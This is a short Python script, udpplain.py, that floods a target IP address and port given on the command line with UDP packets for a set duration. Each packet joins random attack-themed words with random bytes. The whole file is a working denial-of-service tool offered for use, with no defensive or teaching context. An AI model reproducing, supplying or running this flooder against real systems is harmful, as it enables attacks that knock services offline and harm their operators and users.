# udpplain.py
import socket
import random
import sys
import time

def udpplain_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    words = [
        b"FLOOD", b"ATTACK", b"DDOS", b"NETWORK",
        b"PACKET", b"UDP", b"TCP", b"HTTP",
        b"SERVER", b"CLIENT", b"ROUTER", b"SWITCH",
        b"BANDWIDTH", b"LATENCY", b"JITTER", b"THROUGHPUT",
        b"SECURITY", b"FIREWALL", b"PROXY", b"VPN",
        b"MALWARE", b"VIRUS", b"EXPLOIT", b"VULNERABILITY",
        b"RANDOM", b"BYTES", b"DATA", b"PAYLOAD",
        b"SOCKET", b"PORT", b"IP", b"PROTOCOL"
    ]
    
    timeout = time.time() + duration
    while time.time() < timeout:
        sentence = b""
        word_count = random.randint(10, 50)
        for _ in range(word_count):
            sentence += random.choice(words) + b" "
        
        random_bytes = random._urandom(random.randint(100, 1000))
        data = sentence + b"\r\n" + random_bytes
        sock.sendto(data, (target_ip, target_port))
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    udpplain_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
